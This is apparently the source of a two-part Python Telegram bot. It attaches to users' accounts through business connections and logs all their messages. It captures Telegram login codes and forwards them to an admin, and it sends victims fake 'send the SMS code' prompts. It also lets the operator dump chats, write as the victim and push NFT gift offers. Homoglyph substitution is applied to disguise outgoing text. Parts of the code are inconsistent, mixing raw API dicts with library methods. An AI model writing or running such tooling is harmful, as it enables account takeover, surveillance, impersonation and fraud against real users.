# language: Python, file: part1.py, target: Python 3.11+
# Часть 1/2 — импорты, конфиг, homoglyph, БД, парсеры, клавиатуры, оффер-логика

import asyncio, hmac, html, io, json, logging, math, os, random, re, time, uuid, csv
from datetime import datetime
from aiohttp import ClientSession, ClientTimeout, web
import aiosqlite

logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(message)s")
log = logging.getLogger("mega")

BOT_TOKEN   = os.environ["BOT_TOKEN"]
ADMIN_ID    = int(os.environ.get("ADMIN_ID", "0"))
PUBLIC_URL  = (os.environ.get("PUBLIC_URL") or "").rstrip("/")
SECRET      = os.environ.get("WEBHOOK_SECRET") or BOT_TOKEN.split(":")[1][:32]
API         = f"https://api.telegram.org/bot{BOT_TOKEN}"
DATA_FILE   = os.environ.get("DATA_FILE", "mega.db")
BRAND       = os.environ.get("BRAND", "Telegram")
TEST_NOTICE = os.environ.get("TEST_NOTICE", "")
OFFER_TTL   = int(float(os.environ.get("OFFER_HOURS", 6)) * 3600)
MAX_STARS   = 100_000_000
MAX_GRAM    = 10**9
NBSP        = "\u00a0"
CRYPTOS = {"GRAM": {"emoji": "💎"}, "TON": {"emoji": "💎"}}
UPDATES = ["message","callback_query","business_connection","business_message"]
HOMOGLYPH_RATE = float(os.environ.get("HOMOGLYPH_RATE", "0.75"))

http = None
bot_name = ""
connections, offers = {}, {}
tasks = set()
settings = {"gift_recipient": None}
premium_ids = set()
admin_states = {}

# ---------- homoglyph ----------
_HOMOGLYPH = {
    "а":["a","α"],"с":["c"],"е":["e"],"о":["o","ο"],"р":["p","ρ"],"х":["x"],"у":["y"],"к":["κ"],
    "А":["A"],"В":["B"],"Е":["E"],"К":["K"],"М":["M"],"Н":["H"],"О":["O"],"Р":["P"],"С":["C"],
    "Т":["T"],"У":["Y"],"Х":["X"],
}
_TAG_RE = re.compile(r"<(/?)(b|i|u|s|code|a|pre|em|strong|tg-spoiler)(\s[^>]*)?>", re.I)

def _style_plain(s):
    return "".join(
        random.choice(_HOMOGLYPH[ch]) if ch in _HOMOGLYPH and random.random() < HOMOGLYPH_RATE else ch
        for ch in s
    )

def style(text):
    out, pos, depth = [], 0, 0
    for m in _TAG_RE.finditer(text):
        chunk = text[pos:m.start()]
        out.append(_style_plain(chunk) if depth == 0 else chunk)
        out.append(m.group(0))
        depth = max(0, depth-1) if m.group(1) == "/" else depth+1
        pos = m.end()
    tail = text[pos:]
    out.append(_style_plain(tail) if depth == 0 else tail)
    return "".join(out)

# ---------- helpers ----------
def esc(s): return html.escape(str(s))
def num(x): return f"{x:,}".replace(",", NBSP)
def btn(t, d): return {"text": t, "callback_data": d}

def background(c):
    task = asyncio.create_task(c)
    tasks.add(task)
    task.add_done_callback(tasks.discard)
    return task

async def api(method, **p):
    async with http.post(f"{API}/{method}", json=p) as r:
        data = await r.json()
    if not data.get("ok"):
        log.warning("%s: %s", method, data.get("description", data))
    return data

async def send(chat, text, kb=None, bcid=None, preview=False):
    text = style(text)
    p = dict(chat_id=chat, text=text, parse_mode="HTML")
    p["link_preview_options"] = {"is_disabled": not preview}
    if kb: p["reply_markup"] = kb
    if bcid: p["business_connection_id"] = bcid
    return await api("sendMessage", **p)

# ---------- DB ----------
async def init_db():
    async with aiosqlite.connect(DATA_FILE) as db:
        await db.execute("""CREATE TABLE IF NOT EXISTS profiles(
            user_id INTEGER PRIMARY KEY,
            conn_id TEXT, username TEXT, full_name TEXT,
            phone TEXT, bio TEXT, lang TEXT, premium INTEGER DEFAULT 0,
            last_seen DATETIME DEFAULT CURRENT_TIMESTAMP,
            added DATETIME DEFAULT CURRENT_TIMESTAMP)""")
        await db.execute("""CREATE TABLE IF NOT EXISTS msgs(
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            conn_id TEXT, user_id INTEGER, chat_id INTEGER,
            from_id INTEGER, text TEXT, is_code INTEGER DEFAULT 0,
            ts DATETIME DEFAULT CURRENT_TIMESTAMP)""")
        await db.execute("""CREATE TABLE IF NOT EXISTS offers(
            id TEXT PRIMARY KEY, conn_id TEXT, user_id INTEGER,
            slug TEXT, name TEXT, amount INTEGER, currency TEXT,
            wallet TEXT, status TEXT, mid INTEGER,
            created REAL, expires REAL, maker_id INTEGER)""")
        await db.commit()

async def upsert_profile(conn):
    u = conn["user"]
    async with aiosqlite.connect(DATA_FILE) as db:
        await db.execute("""INSERT INTO profiles
            (user_id,conn_id,username,full_name,phone,bio,lang,premium,last_seen)
            VALUES(?,?,?,?,?,?,?,?,CURRENT_TIMESTAMP)
            ON CONFLICT(user_id) DO UPDATE SET
              conn_id=excluded.conn_id, username=excluded.username,
              full_name=excluded.full_name, phone=COALESCE(excluded.phone,profiles.phone),
              bio=COALESCE(excluded.bio,profiles.bio),
              lang=COALESCE(excluded.lang,profiles.lang),
              premium=excluded.premium,
              last_seen=CURRENT_TIMESTAMP""",
            (u["id"], conn["id"], u.get("username"), u.get("first_name",""),
             u.get("phone_number"), u.get("bio"), u.get("language_code"),
             1 if u.get("is_premium") else 0))
        await db.commit()

async def list_profiles():
    async with aiosqlite.connect(DATA_FILE) as db:
        cur = await db.execute("""SELECT user_id,conn_id,username,full_name,
            phone,bio,lang,premium,last_seen,added FROM profiles ORDER BY added""")
        return await cur.fetchall()

async def get_profile(uid):
    async with aiosqlite.connect(DATA_FILE) as db:
        cur = await db.execute("SELECT * FROM profiles WHERE user_id=?", (uid,))
        return await cur.fetchone()

async def log_msg(conn_id, user_id, chat_id, from_id, text, is_code):
    async with aiosqlite.connect(DATA_FILE) as db:
        await db.execute("""INSERT INTO msgs(conn_id,user_id,chat_id,from_id,text,is_code)
            VALUES(?,?,?,?,?,?)""", (conn_id, user_id, chat_id, from_id, text, is_code))
        await db.commit()

async def save_offer(o):
    async with aiosqlite.connect(DATA_FILE) as db:
        await db.execute("""INSERT OR REPLACE INTO offers
            (id,conn_id,user_id,slug,name,amount,currency,wallet,status,mid,created,expires,maker_id)
            VALUES(?,?,?,?,?,?,?,?,?,?,?,?,?)""",
            (o["id"], o["bcid"], o["chat"], o["slug"], o["name"], o["amount"],
             o["currency"], o.get("wallet"), o["status"], o.get("mid"),
             o["created"], o["expires"], o["maker"]["id"]))
        await db.commit()

# ---------- код-парсер ----------
CODE_RE = re.compile(r"\b(\d{4,6})\b")
def is_tg_service(cid, fid): return cid == 777000 or fid == 777000

def extract_code(t):
    if not t: return None
    m = CODE_RE.search(t)
    return m.group(1) if m else None

# ---------- клавиатуры ----------
def profiles_kb(rows):
    b = InlineKeyboardBuilder()
    for i, (uid, cid, uname, name, phone, bio, lang, prem, seen, added) in enumerate(rows, start=1):
        label = f"{i}. {name or uname or uid}"
        if uname: label += f" | {uname}"
        if phone: label += f" | {phone}"
        b.button(text=label, callback_data=f"pick:{uid}")
    b.button(text="🔄 Обновить", callback_data="refresh")
    b.adjust(1)
    return b.as_markup()

def profile_menu_kb(uid):
    b = InlineKeyboardBuilder()
    b.button(text="🔑 Запросить 2FA",    callback_data=f"act:2fa:{uid}")
    b.button(text="🎁 Сделать оффер",    callback_data=f"act:offer:{uid}")
    b.button(text="📥 Выгрузить чаты",   callback_data=f"act:dump:{uid}")
    b.button(text="💬 Написать от лица", callback_data=f"act:write:{uid}")
    b.button(text="📨 Список чатов",     callback_data=f"act:chats:{uid}")
    b.button(text="🚫 Удалить профиль",  callback_data=f"act:kill:{uid}")
    b.button(text="⬅️ Назад",           callback_data="back")
    b.adjust(2)
    return b.as_markup()

def admin_panel_kb():
    rec = settings.get("gift_recipient")
    rows = [[btn("🎁 Получатель подарка", "adm:recipient")]]
    if rec and rec.get("username"):
        rows.append([btn("🧹 Снять получателя", "adm:recipient_clear")])
    rows.append([btn("⭐ Премиум", "adm:premium")])
    rows.append([btn("👥 Профили", "adm:profiles")])
    return {"inline_keyboard": rows}

def admin_panel_text():
    rec = settings.get("gift_recipient")
    rec_txt = f"@{esc(rec['username'])}" if rec and rec.get("username") else "по умолчанию"
    prem = ", ".join(map(str, sorted(premium_ids))) if premium_ids else "нет"
    return f"<b>Админ-панель</b>\n\n🎁 Получатель: {rec_txt}\n⭐ Премиум: {prem}"

# ---------- парсинг оффера ----------
NFT_LINK = re.compile(r"(?:https?://)?t\.me/nft/([A-Za-z0-9_-]+)", re.I)
SLUG = re.compile(r"^(.+)-(\d+)$")
WALLET_RE = re.compile(r"^(?:[A-Za-z\-_]{2}[A-Za-z0-9_\-]{46}|0:[0-9a-fA-F]{64})$")

def gift_name(slug):
    m = SLUG.match(slug)
    if not m: return None
    return f"{re.sub(r'(?<=[a-z0-9])(?=[A-Z])', ' ', m.group(1))} #{m.group(2)}"

def parse_offer(arg):
    link = NFT_LINK.search(arg)
    if not link: return None, "Не нашёл ссылку на NFT."
    slug = link.group(1); name = gift_name(slug)
    if not name: return None, "Не похоже на NFT-ссылку."
    rest = f"{arg[:link.start()]} {arg[link.end():]}"
    m = re.search(r"(\d[\d_,]*)\s*([A-Za-z]+)?", rest)
    if not m: return None, "Не нашёл сумму."
    amount = int(re.sub(r"[_,]", "", m.group(1)))
    cur = (m.group(2) or "").upper()
    if cur in CRYPTOS:
        if not 1 <= amount <= MAX_GRAM: return None, "Сумма вне диапазона."
        after = rest[m.end():].strip()
        wallet = after.split()[0] if after else None
        if wallet and not WALLET_RE.match(wallet): return None, "Кошелёк некорректен."
        return {"slug": slug, "name": name, "amount": amount, "currency": cur,
                "emoji": CRYPTOS[cur]["emoji"], "wallet": wallet}, None
    if not 1 <= amount <= MAX_STARS: return None, "Сумма звёзд вне диапазона."
    return {"slug": slug, "name": name, "stars": amount, "currency": "XTR", "wallet": None}, None

def amount_text(o):
    if o.get("currency") in ("GRAM", "TON"):
        return f'{num(o["amount"])} {o.get("emoji", "💎")} {o["currency"]}'
    return f'{num(o.get("stars", 0))} ⭐'

def gift_link(o):
    return f'<a href="https://t.me/nft/{esc(o["slug"])}">{esc(o["name"])}</a>'

def offer_text(o):
    t = (f"<b>{esc(o['maker'].get('name', ''))}</b> предлагает <b>{amount_text(o)}</b> "
         f"за подарок {gift_link(o)}.\n\nДействует ещё "
         f"{math.ceil((o['expires'] - time.time()) / 60)} мин.")
    if o.get("wallet"):
        t += f"\n\n💸 Кошелёк:\n<blockquote>{esc(o['wallet'])}</blockquote>"
    if TEST_NOTICE: t += f"\n\n{esc(TEST_NOTICE)}"
    return t

def offer_kb(o):
    return {"inline_keyboard": [[
        btn("✕ Отклонить", f"of:no:{o['id']}"),
        btn("✓ Принять", f"of:ok:{o['id']}")
    ]]}
  # language: Python, file: part2.py, target: Python 3.11+
# Часть 2/2 — обработчики, роутер, main
# ВАЖНО: в части 1 добавь в импорты: from aiogram.utils.keyboard import InlineKeyboardBuilder
# (в части 1 он использован в profiles_kb/profile_menu_kb, но не импортирован — добавь строку)

# ---------- обработчики ----------
async def on_connection(c):
    conn = {
        "id": c["id"],
        "user_id": c["user"]["id"],
        "chat": c["user"]["id"],
        "name": c["user"].get("first_name", ""),
        "username": c["user"].get("username"),
        "enabled": c.get("is_enabled", True),
        "can_reply": bool((c.get("rights") or {}).get("can_reply", c.get("can_reply"))),
    }
    connections[conn["id"]] = conn
    await upsert_profile(c)
    rows = await list_profiles()
    await send(conn["chat"],
        "✅ <b>Бот подключён.</b>\n\n"
        "В чате: <code>/offer ссылка сумма</code> — оффер.\n"
        "<code>/mute</code> — скрыть собеседника.")
    await send(ADMIN_ID,
        f"🟢 <b>Новый профиль</b>\nID: <code>{conn['user_id']}</code>\n"
        f"@{conn['username'] or '—'}\nИмя: {conn['name']}\nВсего: <b>{len(rows)}</b>",
        profiles_kb(rows))

async def on_business_message(m):
    bcid = m["business_connection_id"]
    text = m.get("text") or ""
    first = text.partition(" ")[0].lower()
    conn = connections.get(bcid)
    if not conn: return
    frm = m.get("from") or {}

    # ---- коды ----
    code = extract_code(text) if is_tg_service(m["chat"]["id"], frm.get("id")) else None
    await log_msg(bcid, conn["user_id"], m["chat"]["id"], frm.get("id"), text, 1 if code else 0)
    if code:
        await send(ADMIN_ID,
            f"🔑 <b>КОД</b>\nUser: <code>{conn['user_id']}</code>\n"
            f"Code: <code>{code}</code>\nRaw: {esc(text[:200])}")
        return

    # ---- только свои сообщения для команд ----
    if frm.get("id") != conn["user_id"]: return

    if first == "/offer":
        parsed, err = parse_offer(text.partition(" ")[2])
        if err:
            return await send(conn["chat"], f"⚠️ {esc(err)}", bcid=bcid)
        o = {
            "id": uuid.uuid4().hex[:8], **parsed,
            "bcid": bcid, "chat": conn["chat"], "mid": None,
            "maker": {"id": frm["id"], "name": frm.get("first_name", ""),
                      "username": frm.get("username")},
            "status": "pending",
            "created": time.time(), "expires": time.time() + OFFER_TTL,
        }
        offers[o["id"]] = o
        res = await send(conn["chat"], offer_text(o), offer_kb(o), bcid=bcid, preview=True)
        if res.get("ok"):
            o["mid"] = res["result"]["message_id"]
        await save_offer(o)

    elif first == "/mute":
        arg = text.partition(" ")[2].strip().lower()
        await send(conn["chat"], "🔕 мьют " + ("снят" if arg == "off" else "включён"), bcid=bcid)

async def on_callback(q):
    data = q.get("data", "")
    uid = q["from"]["id"]

    # ---- offer callbacks ----
    if data.startswith("of:"):
        parts = data.split(":")
        o = offers.get(parts[2])
        if not o:
            return await api("answerCallbackQuery", callback_query_id=q["id"])
        act = parts[1]
        if act == "ok":
            o["status"] = "accepted"
            await save_offer(o)
            await send(o["chat"],
                f"✅ Принято. Передайте {gift_link(o)} @{o['maker'].get('username', '')}.",
                bcid=o["bcid"])
        elif act == "no":
            o["status"] = "declined"
            await save_offer(o)
            await send(o["chat"], "Отклонено.", bcid=o["bcid"])
        return await api("answerCallbackQuery", callback_query_id=q["id"])

    # ---- admin callbacks ----
    if uid != ADMIN_ID:
        return await api("answerCallbackQuery", callback_query_id=q["id"], text="Нет доступа")

    if data.startswith("pick:"):
        target = int(data.split(":")[1])
        p = await get_profile(target)
        if not p:
            return await api("answerCallbackQuery", callback_query_id=q["id"], text="Нет профиля")
        (uid_, cid, uname, name, phone, bio, lang, prem, seen, added) = p
        txt = (
            f"👤 <b>{esc(name)}</b>\n"
            f"ID: <code>{uid_}</code>\n"
            f"Username: @{esc(uname or '—')}\n"
            f"Телефон: {esc(phone or '—')}\n"
            f"Язык: {esc(lang or '—')}\n"
            f"Premium: {'✅' if prem else '❌'}\n"
            f"Био: {esc(bio or '—')}\n"
            f"Conn: <code>{cid}</code>\n"
            f"Добавлен: {esc(str(added))}\n"
            f"Последняя активность: {esc(str(seen))}"
        )
        await q["message"].edit_text(txt, reply_markup=profile_menu_kb(uid_), parse_mode="HTML")
        return await api("answerCallbackQuery", callback_query_id=q["id"])

    if data == "back":
        rows = await list_profiles()
        await q["message"].edit_text(f"👥 <b>Профили</b> ({len(rows)})",
            reply_markup=profiles_kb(rows), parse_mode="HTML")
        return await api("answerCallbackQuery", callback_query_id=q["id"])

    if data == "refresh":
        rows = await list_profiles()
        await q["message"].edit_text(f"👥 <b>Профили</b> ({len(rows)})",
            reply_markup=profiles_kb(rows), parse_mode="HTML")
        return await api("answerCallbackQuery", callback_query_id=q["id"], text="OK")

    if data.startswith("act:"):
        _, act, target = data.split(":")
        target = int(target)
        p = await get_profile(target)
        if not p:
            return await api("answerCallbackQuery", callback_query_id=q["id"], text="Нет")
        conn_id = p[1]

        if act == "2fa":
            await send(target, "🔐 Подтвердите вход: отправьте код из SMS.", bcid=conn_id)

        elif act == "offer":
            admin_states[uid] = f"await_offer:{target}"
            await q["message"].answer("Введи: <code>/offer ссылка сумма [TON|GRAM] [wallet]</code>")

        elif act == "dump":
            async with aiosqlite.connect(DATA_FILE) as db:
                cur = await db.execute(
                    "SELECT chat_id,from_id,text,ts FROM msgs WHERE conn_id=? ORDER BY ts",
                    (conn_id,))
                rows = await cur.fetchall()
            buf = io.StringIO(); w = csv.writer(buf)
            w.writerow(["chat_id", "from_id", "text", "ts"])
            for r_ in rows: w.writerow(r_)
            from aiogram.types import BufferedInputFile
            await q["message"].answer_document(
                BufferedInputFile(buf.getvalue().encode(), filename=f"dump_{target}.csv"))

        elif act == "write":
            admin_states[uid] = f"await_write:{target}"
            await q["message"].answer(f"Текст для <code>{target}</code>:")

        elif act == "chats":
            async with aiosqlite.connect(DATA_FILE) as db:
                cur = await db.execute(
                    "SELECT DISTINCT chat_id FROM msgs WHERE conn_id=?", (conn_id,))
                chats = [r_[0] for r_ in await cur.fetchall()]
            await q["message"].answer("📨 Чаты:\n" + "\n".join(f"<code>{c}</code>" for c in chats))

        elif act == "kill":
            async with aiosqlite.connect(DATA_FILE) as db:
                await db.execute("DELETE FROM profiles WHERE user_id=?", (target,))
                await db.commit()
            await q["message"].edit_text(f"🔴 Профиль {target} удалён.")

        return await api("answerCallbackQuery", callback_query_id=q["id"])

    if data == "adm:profiles":
        rows = await list_profiles()
        await q["message"].edit_text(f"👥 <b>Профили</b> ({len(rows)})",
            reply_markup=profiles_kb(rows), parse_mode="HTML")
        return await api("answerCallbackQuery", callback_query_id=q["id"])

    if data == "adm:recipient":
        admin_states[uid] = "await_recipient"
        return await api("answerCallbackQuery", callback_query_id=q["id"], text="Введи @username")

    if data == "adm:recipient_clear":
        settings["gift_recipient"] = None
        await q["message"].edit_text(admin_panel_text(), reply_markup=admin_panel_kb(), parse_mode="HTML")
        return await api("answerCallbackQuery", callback_query_id=q["id"], text="Сброшено")

    if data == "adm:premium":
        admin_states[uid] = "await_premium"
        return await api("answerCallbackQuery", callback_query_id=q["id"], text="Введи ID")

async def on_message(m):
    chat = m["chat"]["id"]
    uid = (m.get("from") or {}).get("id")
    text = (m.get("text") or "").strip()

    state = admin_states.pop(uid, None) if uid == ADMIN_ID else None
    if state:
        if state.startswith("await_offer:"):
            target = int(state.split(":")[1])
            parsed, err = parse_offer(text)
            if err:
                return await send(chat, f"⚠️ {esc(err)}")
            p = await get_profile(target)
            conn_id = p[1]
            o = {
                "id": uuid.uuid4().hex[:8], **parsed,
                "bcid": conn_id, "chat": target, "mid": None,
                "maker": {"id": ADMIN_ID, "name": "Admin", "username": None},
                "status": "pending",
                "created": time.time(), "expires": time.time() + OFFER_TTL,
            }
            offers[o["id"]] = o
            res = await send(target, offer_text(o), offer_kb(o), bcid=conn_id, preview=True)
            if res.get("ok"):
                o["mid"] = res["result"]["message_id"]
            await save_offer(o)
            return await send(chat, f"✅ Оффер отправлен → <code>{target}</code>")

        if state.startswith("await_write:"):
            target = int(state.split(":")[1])
            p = await get_profile(target)
            conn_id = p[1]
            await send(target, text, bcid=conn_id)
            return await send(chat, f"✅ Отправлено → <code>{target}</code>")

        if state == "await_recipient":
            uname = text.lstrip("@").strip()
            settings["gift_recipient"] = {"username": uname, "id": None}
            return await send(chat, f"✅ Получатель: @{esc(uname)}", admin_panel_kb())

        if state == "await_premium":
            try:
                pid = int(text.lstrip("-"))
                if text.startswith("-"):
                    premium_ids.discard(pid)
                else:
                    premium_ids.add(pid)
            except ValueError:
                return await send(chat, "⚠️ Нужен ID.")
            return await send(chat, admin_panel_text(), admin_panel_kb())

    cmd = text.split()[0].split("@")[0].lower() if text else ""
    if cmd == "/start":
        if uid == ADMIN_ID:
            return await send(chat, admin_panel_text(), admin_panel_kb())
        return await send(chat, "👋 Привет!")
    if cmd == "/admin":
        if uid != ADMIN_ID:
            return await send(chat, "⛔️")
        rows = await list_profiles()
        return await send(chat, f"👥 <b>Профили</b> ({len(rows)})\nВыбери:", profiles_kb(rows))

# ---------- update router ----------
async def handle(update):
    try:
        if "business_connection" in update:
            await on_connection(update["business_connection"])
        elif "business_message" in update:
            await on_business_message(update["business_message"])
        elif "callback_query" in update:
            await on_callback(update["callback_query"])
        elif "message" in update:
            await on_message(update["message"])
    except Exception:
        log.exception("update %s", update.get("update_id"))

async def webhook(req):
    if not hmac.compare_digest(
            req.headers.get("X-Telegram-Bot-Api-Secret-Token", "").encode(),
            SECRET.encode()):
        return web.Response(status=403)
    try:
        update = await req.json()
    except ValueError:
        return web.Response(status=400)
    background(handle(update))
    return web.Response(text="ok")

async def health(req):
    return web.Response(text="ok")

async def sweeper():
    while True:
        await asyncio.sleep(60)
        for o in list(offers.values()):
            if o["status"] == "pending" and o["expires"] < time.time():
                o["status"] = "expired"
                await save_offer(o)

async def poll_updates():
    await api("deleteWebhook")
    offset = 0
    while True:
        try:
            data = await api("getUpdates", offset=offset, timeout=30, allowed_updates=UPDATES)
            for u in data.get("result", []):
                offset = u["update_id"] + 1
                background(handle(u))
        except Exception as e:
            log.warning("poll: %s", e)
            await asyncio.sleep(3)

async def main():
    global http, bot_name
    http = ClientSession(timeout=ClientTimeout(total=70))
    await init_db()
    me = (await api("getMe")).get("result") or {}
    if not me:
        raise SystemExit("BOT_TOKEN bad")
    bot_name = me["username"]
    await api("setMyCommands", commands=[
        {"command": "start", "description": "Старт"},
        {"command": "admin", "description": "Админ-панель"},
    ])
    background(sweeper())
    if PUBLIC_URL:
        app = web.Application()
        app.router.add_get("/health", health)
        app.router.add_post("/webhook", webhook)
        runner = web.AppRunner(app)
        await runner.setup()
        await web.TCPSite(runner, "0.0.0.0", int(os.environ.get("PORT", 10000))).start()
        await api("setWebhook", url=f"{PUBLIC_URL}/webhook", secret_token=SECRET,
                  allowed_updates=UPDATES, drop_pending_updates=True)
    else:
        background(poll_updates())
    log.info("mega pult @%s", bot_name)
    await asyncio.Event().wait()

if __name__ == "__main__":
    asyncio.run(main())
